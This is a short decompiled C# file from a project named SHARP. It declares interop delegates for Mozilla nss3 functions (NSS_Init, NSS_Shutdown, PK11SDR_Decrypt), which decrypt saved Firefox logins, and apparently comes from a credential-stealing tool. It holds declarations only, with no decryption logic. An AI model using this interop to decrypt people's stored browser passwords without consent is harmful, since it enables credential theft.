﻿using System;
using System.Runtime.InteropServices;

namespace SHARP
{
	// Token: 0x02000012 RID: 18
	internal sealed class Nss3
	{
		// Token: 0x0200009A RID: 154
		public struct TSECItem
		{
			// Token: 0x04000215 RID: 533
			public int SECItemType;

			// Token: 0x04000216 RID: 534
			public IntPtr SECItemData;

			// Token: 0x04000217 RID: 535
			public int SECItemLen;
		}

		// Token: 0x0200009B RID: 155
		// (Invoke) Token: 0x060002E9 RID: 745
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long NssInit(string sDirectory);

		// Token: 0x0200009C RID: 156
		// (Invoke) Token: 0x060002ED RID: 749
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long NssShutdown();

		// Token: 0x0200009D RID: 157
		// (Invoke) Token: 0x060002F1 RID: 753
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int Pk11SdrDecrypt(ref Nss3.TSECItem tsData, ref Nss3.TSECItem tsResult, int iContent);
	}
}
